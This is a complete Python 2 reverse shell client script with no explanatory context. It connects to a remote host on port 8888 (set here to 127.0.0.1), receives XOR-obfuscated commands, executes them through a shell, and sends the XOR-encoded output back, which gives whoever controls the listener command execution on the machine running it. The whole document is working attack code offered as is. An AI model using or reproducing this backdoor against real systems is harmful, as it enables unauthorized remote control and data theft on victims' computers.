#! /usr/bin/env python
# -*- coding:utf-8 -*-
import socket, subprocess, sys

BUF_SIZE = 2048
RHOST = '127.0.0.1'
print RHOST
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, 8888))
while True:
    data = s.recv(BUF_SIZE)
    decode = bytearray(data)
    for i in range(len(data)):
        decode[i] ^= 0x23
    child = subprocess.Popen(str(decode), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    STDOUT, STDERR = child.communicate()
    if STDOUT:
        encode = bytearray(STDOUT)
    else:
        encode = bytearray(STDERR)
    for i in range(len(encode)):
        encode[i] ^= 0x23
    s.send(encode)
s.close()